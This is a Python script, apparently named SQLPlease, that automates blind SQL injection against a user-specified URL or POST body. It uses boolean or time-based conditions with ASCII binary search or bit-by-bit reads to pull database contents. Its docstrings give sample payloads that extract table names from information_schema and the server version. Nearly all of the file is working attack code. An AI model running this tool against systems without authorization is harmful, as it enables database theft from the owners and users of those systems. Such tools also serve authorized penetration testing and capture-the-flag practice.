#!/usr/bin/env python
"""
    IMPORTANT NOTE:
        Unless you know what you are doing, do not edit this script except for the variable `kwargs` in the main.
"""
# TODO:
#   Make it possible to provide a request in a file, parse that request and use it for cookies, headers, etc.
#   Save state from a log file. With an argument, use the last file to continue the injection according to the command line and last results found in the file.
#   Right now, a length or count of more than 128 is not possible. However, it takes more requests to find a bigger length/count than actually do 7 requests that give a null byte in the end. Therefore, make it either that the length/count is only available for ASCII search or find a better/faster algorithm.
#

import os
import sys
import copy
import json
import time
import urllib3
import logging
import argparse
import requests
import traceback

from datetime import datetime
from logging import NOTSET, DEBUG, INFO, WARNING, ERROR, CRITICAL, FATAL

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LOGGING_LEVEL = {
    "debug" : DEBUG,
    "info" : INFO,
    "warning" : WARNING,
    "error" : ERROR,
    "critical" : CRITICAL,
}

def userInputs(kwargs):
    """ Payload requires some attributes in order for it to work.
            Both:
                {charIndex}:
                    Mandatory. Character index of a string. Example: `SUBSTRING(...,{charIndex},1)`
                {offsetIndex}:
                    Mandatory. Offset of the row. Example: `LIMIT {offsetIndex}, 1`

            ASCII:
                {ascii}:
                    Mandatory. Minimum inclusive ASCII value. 32 if printable only, else 0. Example: `ASCII(...)>={ascii}`
                {max}:
                    Optional. Maximum inclusive ASCII value. 126 if printable only, else 255. Example: `ASCII(...) BETWEEN {ascii} AND {max}`

                Example: 
                    With multiple rows: `ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1))>={ascii}`
                    With one row:       `ASCII(SUBSTRING((SELECT @@version),{charIndex},1))>={ascii}`

            Binary:
                {bitIndex}:
                    Mandatory. Bit index of a character. Example: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING(...)))),{bitIndex},1)=1`

                Example: 
                    With mulitple rows: `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {offsetIndex},1),{charIndex},1)))),{bitIndex},1)=1`
                    With one row:       `SUBSTRING(REVERSE(BIN(ASCII(SUBSTRING((SELECT @@version),{charIndex},1)))),{bitIndex},1)=1`

        To know where to inject the payload, the URL or the data must contain the keywork {payload}.
            Example: `url = http://127.0.0.1/?id={payload}`
            Example: `data = {"id":"{payload}"}`
    """
    kwargs["payload"] = ""
    
    # Request Method (handles what the module requests can handle).
    kwargs["method"] = "get".lower()

    # URL
    # Example: `http://127.0.0.1/?id={payload}`
    kwargs["url"] = ""

    """
        POST data in many format.
            URL encoded: `{"id":"{payload}"}`
            JSON: `{"queries":[{"id":"{payload}"}]}`
            XML: `"<element>{payload}</element>"`
            Multipart/form-data: `{"parameterName":("fileName","{payload}")}` or `{"parameterName":(None,"{payload}")}` or `{"parameterName":"{payload}"}`
    """
    kwargs["data"] = {}

    """
        - JSON: [application/json or json]
        - Multipart/form-data: [multipart/form-data or multipart or form-data].
        - XML: If you need XML, you must add the header for it and keep this variable empty. Example: `kwargs["requests"]["headers"] = {"Content-Type":"application/xml"}`.
        - Empty or anything else reverts to application/x-www-form-urlencoded.
        
        Important note:
            This variable is only used to determine which parameter to use for the requests call (data, json or files). It is not sent has an header.
    """
    kwargs["contentType"] = ""

    # If you want to count the number of rows prior extracting them, use the following parameter. However, it may not work properly and increase the duration of the script.
    # Example: `(select count(table_name) from information_schema.tables)>{ascii}`
    kwargs["countRows"] = "" 
    
    # If you want to find the length of the word to extract prior extracting it, use the following parameter. However, it may not work properly and increase the duration of the script.
    # Example: `(select length(@@version))>{ascii}`
    kwargs["findLength"] = "" 

    # minAscii and maxAscii are INCLUSIVE. Meaning that your payload must use GREATER THAN {ascii}.
    kwargs["minAscii"] = 32
    kwargs["maxAscii"] = 126

    # Amount of bits to read from a binary search. 7 if you search for only printables (lower than 128), 8 if your charset is bigger than 127.
    kwargs["binaryLength"] = 7
    
    # True if you want to use binary instead of ASCII (False)
    kwargs["useBinary"] = False

    # Sleep in second between each request. This is mostly used to slow down the script.
    kwargs["sleep"] = 0


    # The following parameter is used if you want to use boolean. The value of the parameter will be evaluated in order to know if it is true where `r` is the object containing the result of the requests.
    # Example: `"Found" in r.text` 
    # Example: `1 == r.json()["results"][0]["id"]`
    kwargs["evalCondition"] = ""
    
    # True if you want to use time instead of boolean (False)
    kwargs["timeBased"] = False

    # Requests parameters.
    #   verify: validate SSL/TLS certificates.
    #   allow_redirects: follow HTTP status 302.
    #   proxies: Example: `{"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}`
    #
    #   For more information, https://docs.python-requests.org/en/latest/.
    kwargs["requests"]["verify"] = False
    kwargs["requests"]["allow_redirects"] = False
    kwargs["requests"]["cookies"] = {}
    kwargs["requests"]["headers"] = {}
    kwargs["requests"]["proxies"] = {}

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--request", dest="request", help="File containing an HTTP request to set the URL, method, data, cookies and headers. Don't forget to setup the {payload} and etc.", type=str)
    loggingParser = parser.add_argument_group("logging arguments")
    loggingParser.add_argument("-o", "--output", dest="directory", help="Directory where to put the logging file (default is 'results'.)", default="results", type=str)
    loggingParser.add_argument("-l", "--logging-level", dest="loggingLevel", help="Default warning", choices=["debug","info","warning","error","critical"], default="info", type=str)
    loggingParser.add_argument("-c", "--useColor", dest="useColor", help="Use color for the logging in console.", action="store_true")

    args = parser.parse_args()
    
    directory = args.directory
    loggingLevel = args.loggingLevel
    useColor = args.useColor

    kwargs = {"requests":{}}
    userInputs(kwargs)

    ####################################################################
    # Unless you know what you are doing, do not edit past this point. #
    ####################################################################

    # If the variable directory is not set, the logs will be stored in ./results/
    if(not directory):
        directory = os.path.join(os.path.dirname(os.path.realpath(__file__)), "results")

    # If the directory for logging does not exist, create it.
    if(not os.path.exists(directory)):
        os.mkdir(directory)
    Logger(directory)
    
    if(useColor):
        Logger().updateUseColor(useColor)

    if(loggingLevel and loggingLevel.lower() in LOGGING_LEVEL):
        Logger().updateStreamLevel(LOGGING_LEVEL[loggingLevel.lower()])
    else:
        Logger().updateStreamLevel(LOGGING_LEVEL["info"])

    # If the keyword {payload} is not found in URL or DATA, stop the script.
    if(not "{payload}" in kwargs["url"] and (not kwargs["data"] or not "{payload}" in json.dumps(kwargs["data"]))):
        Logger().error("Use the keyword {payload} (case sensitive) in the url or data parameters to make the program understand where to inject the payload.")
        sys.exit(1)

    # Keep the name of the parameter that includes the keyword {payload}.
    if(kwargs["data"]):
        # This recursive function is used to find the parameter containing the keyword {payload} in a nested array.
        def findPayload(key, value):
            if(isinstance(value, dict)):
                for k,v in value.items():
                    rk = findPayload(k,v)
                    if(rk is not None):
                        return [key,*rk]
            if(isinstance(value, list) or isinstance(value, tuple)):
                for i in range(len(value)):
                    rk = findPayload(i,value[i])
                    if(rk is not None):
                        return [key, *rk]
            if(isinstance(value, str)):
                if("{payload}" in value):
                    return [key]
            return None

        # Set the parameter used in the request to either json, files or data depending on the content type.
        if(kwargs["contentType"] in ("application/json","json")):
            kwargs["postDataType"] = "json"
        elif(kwargs["contentType"] in ("multipart/form-data","multipart","form-data")):
            kwargs["postDataType"] = "files"
        else:
            kwargs["postDataType"] = "data"

        # Find the parameter in which the keyword {payload} is nested.
        if(isinstance(kwargs["data"], dict)):
            for k,v in kwargs["data"].items():
                kwargs["parameter"] = findPayload(k,v)
                if(kwargs["parameter"] is not None):
                    break
        if(isinstance(kwargs["data"], list)):
            for i in range(len(kwargs["data"])):
                kwargs["parameter"] = findPayload(i,kwargs["data"][i])
                if(kwargs["parameter"] is not None):
                    break

        if(isinstance(kwargs["data"], str)):
            # Set the parameter to an empty string so the script knows to format the data directly as it is a string and not an array. 
            kwargs["parameter"] = ""

        kwargs["data"] = {kwargs["postDataType"]: kwargs["data"]}
    else:
        # Make sure that if data is not used, it's a dictionary so it can be unrolled in the request (an empty string cannot be unrolled).
        kwargs["data"] = {}

    SQLPlease(**kwargs).doInjection()

class Singleton(type):
    _instances = {}
    def __call__(cls, *args, **kwargs):
        if cls not in cls._instances:
            cls._instances[cls] = super(Singleton, cls).__call__(*args, **kwargs)
        return cls._instances[cls]

class ColoredFormatter(logging.Formatter):
    COLOR_SEQ = "\033[1;{}m"
    RESET_SEQ = "\033[0m"

    COLORS = {
        'DEBUG': 6,
        'INFO': 4,
        'WARNING': 3,
        'ERROR': 1,
        'CRITICAL': 1,
        'FATAL': 1,
    }

    def __init__(self, fmt, useColor=True):
        logging.Formatter.__init__(self, fmt)
        self.__useColor = useColor

    def format(self, record):
        if self.__useColor and record.levelname in self.COLORS:
            record.msg = "{color}{msg}{reset}".format(color=self.COLOR_SEQ.format(30 + self.COLORS[record.levelname]),msg=record.msg,reset=self.RESET_SEQ)
            record.msg = "{color}{msg}{reset}".format(color=self.COLOR_SEQ.format(30 + self.COLORS[record.levelname]),msg=record.msg,reset=self.RESET_SEQ)

        return logging.Formatter.format(self, record)

    def toggleUseColor(self, useColor):
        self.__useColor = useColor
        
class Logger(object, metaclass=Singleton):
    def __init__(self, directory="results"):
        logfilename = "{dir}/{fname}.{ext}".format(dir=directory, fname=datetime.utcnow().strftime("%Y-%m-%d_%H%M%S.%f"), ext="txt")
        self.__logger = logging.getLogger(logfilename)
        self.__logger.setLevel(DEBUG)

        self.__fh = logging.FileHandler(logfilename)
        self.__fh.setLevel(DEBUG)
        self.__fh.setFormatter(logging.Formatter(fmt="[%(levelname)s] %(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S"))

        self.__colorFormatter = ColoredFormatter(fmt="%(message)s", useColor=False)

        self.__sh = logging.StreamHandler()
        self.__sh.setLevel(DEBUG)
        self.__sh.setFormatter(self.__colorFormatter)

        self.__logger.addHandler(self.__fh)
        self.__logger.addHandler(self.__sh)
        
    def __getattr__(self, attr):
        return self.__logger.__getattribute__(attr)

    def updateStreamLevel(self, level):
        self.__logger.setLevel(level)

    def updateUseColor(self, useColor):
        self.__colorFormatter.toggleUseColor(useColor)

class SQLPlease(object):
    def __init__(self, *args, **kwargs):
        for k, v in kwargs.items():
            self.__dict__[k] = v

        Logger().info(json.dumps(self.__dict__))

        self.__time = None
        self.__amountOfRequests = 0

    def __updateDataPayload(self, data, target, newData):
        """
            data: dictionary, list or string contaning the keyword {payload}.
            target: list containing the path to the value to through the dict `data`. Or string if `data` is a string.
            newData: value to replace the keyword {payload}.
        """
        if(isinstance(target,str)):
            return data.format(payload=newData)
        elif(len(target) != 1):
            data[target[0]] = self.__updateDataPayload(data[target[0]], target[1:], newData)
        else:
            if(isinstance(data, tuple)):
                data = (
                    data[0].format(payload=newData) if not target[0] else data[0],
                    data[1].format(payload=newData) if target[0] else data[1]
                )
            else:
                data[target[0]] = data[target[0]].format(payload=newData)

        return data

    def doInjection(self, *args, **kwargs):
        self.__time = time.time()
        answers = []
        offsetIndex = len(answers)

        originalPayload = self.payload
        originalCountRowsPayload = self.countRows
        originalFindLengthPayload = self.findLength

        # Delete the keywords countRows and findLength so if they are not set, the script will not get confused during the extraction.
        del self.countRows
        del self.findLength
        
        # If the query only fetch one thing (example (SELECT @@version)), then make the count at 1.
        if(not "{offsetIndex}" in originalPayload):
            count = 1
        else:
            count = 0
        
        try:
            while count == 0 or offsetIndex < count:
                if(originalCountRowsPayload and count == 0):
                    # Set back the keyword countRows so the function knows it's for a count.
                    self.countRows = originalCountRowsPayload
                    self.payload = originalCountRowsPayload.format(bitIndex="{bitIndex}") if self.useBinary else originalCountRowsPayload

                    # Keep the count variable for this loop, no need to put it in the kwargs.
                    if(self.useBinary):
                        count = self.injectionBinary(*args, **kwargs)
                    else:

                        count = self.injectionAscii(*args, **kwargs)
                    
                    Logger().info("Counted {} rows".format(count))
                    
                    # Delete back the keyword countRows.
                    del self.countRows

                if(originalFindLengthPayload):
                    # Set back the keyword findLength so the function knows it's for a word length.
                    self.findLength = originalFindLengthPayload
                    self.payload = originalFindLengthPayload.format(bitIndex="{bitIndex}", offsetIndex=offsetIndex) if self.useBinary else originalFindLengthPayload.format(ascii="{ascii}", offsetIndex=offsetIndex)

                    # Set the length in the kwards so the function knows that it is useless to extract a final character equal to a null byte.
                    if(self.useBinary):
                        self.length = self.injectionBinary(*args, **kwargs)
                    else:
                        self.length = self.injectionAscii(*args, **kwargs)

                    if(self.length == ""):
                        Logger().warning("Find length failed, continue the execution without finding length.".format(self.length))
                        del originalFindLengthPayload
                        del self.length
                    else:
                        Logger().info("Next word of length {}".format(self.length))
                    
                    # Delete back the keyword findLength.
                    del self.findLength

                self.payload = originalPayload.format(charIndex="{charIndex}", bitIndex="{bitIndex}", offsetIndex=offsetIndex) if self.useBinary else originalPayload.format(charIndex="{charIndex}", ascii="{ascii}", offsetIndex=offsetIndex, max="{max}")

                if(self.useBinary):
                    answer = self.injectionBinary(*args, **kwargs)
                else:
                    answer = self.injectionAscii(*args, **kwargs)

                if(answer == ""):
                    break
                else:
                    # More of a safety net although not necessary since if the argument to find lengths is there, it should be refreshed for every single word extracted.
                    if("length" in self.__dict__): del self.length

                    answers.append(answer)
                    offsetIndex += 1

                    Logger().warning(answer)
                    Logger().debug(", ".join(answers))
        except KeyboardInterrupt:
            Logger().info("Stopped by keyboard interruption.")
        except Exception as e:
            Logger().critical(traceback.format_exc())
        finally:
            if(answers):
                Logger().warning(", ".join(answers))
            else:
                Logger().info("No results.")
            Logger().info("Finished {} requests".format(self.__amountOfRequests))
            Logger().info("Elasped time: {}".format(time.time() - self.__time))

    def injectionAscii(self, *args, **kwargs):
        MIN = self.minAscii
        MAX = self.maxAscii

        continuing = True

        answer = ""
        charIndex = len(answer)+1
        
        minAscii = MIN if not "countRows" in self.__dict__ and not "findLength" in self.__dict__ else 0
        maxAscii = MAX if not "countRows" in self.__dict__ and not "findLength" in self.__dict__ else 1000
        currentAscii = int((minAscii+maxAscii)/2)

        tested = {}
        amountOfRequests = 0

        try:
            while continuing:
                if("length" in self.__dict__ and charIndex == self.length+1):
                    Logger().debug("Found {} in {} requests".format(answer, amountOfRequests))
                    self.__amountOfRequests += amountOfRequests
                    return answer

                if(self.sleep > 0):
                    time.sleep(self.sleep)
                
                data = copy.deepcopy(self.data)

                payload = self.payload.format(charIndex=charIndex, ascii=currentAscii, max=maxAscii)
                if("parameter" in self.__dict__):
                    data[self.postDataType] = self.__updateDataPayload(data[self.postDataType], self.parameter, payload)
                
                url = self.url.format(payload=payload)
                r = requests.__getattribute__(self.method)(url, **data, **self.requests)
                amountOfRequests += 1

                condition = False
                if(self.timeBased > 0):
                    condition = r.elapsed.total_seconds() > self.timeBased
                elif(self.evalCondition != ""):
                    condition = eval(self.evalCondition)

                tested[currentAscii] = condition

                if(condition): #true
                    minAscii = currentAscii
                    currentAscii = int((minAscii+maxAscii)/2)
                else:
                    maxAscii = currentAscii
                    currentAscii = int((minAscii+maxAscii)/2)

                if(currentAscii in tested and currentAscii+1 in tested and tested[currentAscii] != tested[currentAscii+1] and tested[currentAscii]):
                    if("countRows" in self.__dict__ or "findLength" in self.__dict__):
                        Logger().debug("Found {} in {} requests".format(currentAscii, amountOfRequests))
                        self.__amountOfRequests += amountOfRequests
                        return currentAscii

                    answer += chr(currentAscii)
                    Logger().debug("Found {} - {}".format(currentAscii, answer))
                    minAscii = MIN
                    maxAscii = MAX
                    currentAscii = int((minAscii+maxAscii)/2)
                    charIndex+=1
                    del tested
                    tested = {}
                elif(currentAscii == minAscii):
                    Logger().debug("Found {} in {} requests".format(answer, amountOfRequests))
                    self.__amountOfRequests += amountOfRequests
                    return answer
        except KeyboardInterrupt:
            Logger().warning(answer)
            raise KeyboardInterrupt
        except Exception as e:
            raise e

    def injectionBinary(self, *args, **kwargs):
        binary = ""
        bitIndex = len(binary)+1
        
        answer = ""
        charIndex = len(answer)+1

        amountOfRequests = 0

        try:
            while True:
                if("length" in self.__dict__ and charIndex == self.length+1):
                    Logger().debug("Found {} in {} requests".format(answer, amountOfRequests))
                    self.__amountOfRequests += amountOfRequests
                    return answer

                if(self.sleep > 0):
                    time.sleep(self.sleep)
                
                data = copy.deepcopy(self.data)
                payload = self.payload.format(charIndex=charIndex, bitIndex=bitIndex)

                if("parameter" in self.__dict__):
                    data[self.postDataType] = self.__updateDataPayload(data[self.postDataType], self.parameter, payload)
                
                url = self.url.format(payload=payload)
                r = requests.__getattribute__(self.method)(url, **data, **self.requests)
                amountOfRequests += 1

                condition = False
                if(self.timeBased > 0):
                    condition = r.elapsed.total_seconds() > self.timeBased
                elif(self.evalCondition != ""):
                    condition = eval(self.evalCondition)

                if(condition): #true
                    binary += "1"
                else:
                    binary += "0"

                Logger().debug("Found {}".format(binary[::-1]))
                if(bitIndex == self.binaryLength):
                    char = int(binary[::-1],2)
                    if("findLength" in self.__dict__ or "countRows" in self.__dict__): 
                        Logger().debug("Found {} in {} requests".format(char, amountOfRequests))
                        self.__amountOfRequests += amountOfRequests
                        return char

                    if(char == 0):
                        Logger().debug("Found {} in {} requests".format(answer, amountOfRequests))
                        self.__amountOfRequests += amountOfRequests
                        return answer

                    answer += chr(char)
                    Logger().debug("Found {} - {}".format(binary[::-1], answer))
                    binary = ""
                    bitIndex = 1
                    charIndex += 1
                else:
                    bitIndex += 1
        except KeyboardInterrupt:
            Logger().warning(answer)
            raise KeyboardInterrupt
        except Exception as e:
            raise e

if __name__ == '__main__':
    main()